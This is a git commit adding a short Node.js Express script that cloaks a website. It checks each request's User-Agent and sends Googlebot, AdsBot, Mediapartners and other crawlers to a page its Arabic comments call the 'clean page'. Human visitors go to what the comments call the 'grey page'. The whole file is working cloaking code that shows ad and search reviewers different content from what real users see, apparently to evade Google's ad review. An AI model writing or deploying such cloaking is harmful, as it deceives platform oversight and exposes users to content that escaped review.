3199d5c9b9cae36a5524a84776d3a3a4668ca5fc
moasderty6 <moooody.18.18.18@gmail.com>
2025-07-17 06:57:37 +0300

    Create Dick.js

---
+++ Dick.js
@@ -0,0 +1,24 @@
+const express = require("express");
+const app = express();
+
+app.get("/", (req, res) => {
+    const userAgent = req.headers['user-agent'].toLowerCase();
+
+    // كلمات تدل على أنه بوت جوجل
+    if (
+        userAgent.includes("googlebot") ||
+        userAgent.includes("adsbot") ||
+        userAgent.includes("crawler") ||
+        userAgent.includes("spider") ||
+        userAgent.includes("mediapartners")
+    ) {
+        // إعادة التوجيه إلى الصفحة النظيفة
+        return res.redirect("https://treesaudia.wixstudio.com/website/blank-4");
+    } else {
+        // إعادة التوجيه إلى الصفحة الرمادية للبشر
+        return res.redirect("https://treesaudia.wixstudio.com/website");
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Bridge running on port ${PORT}`));
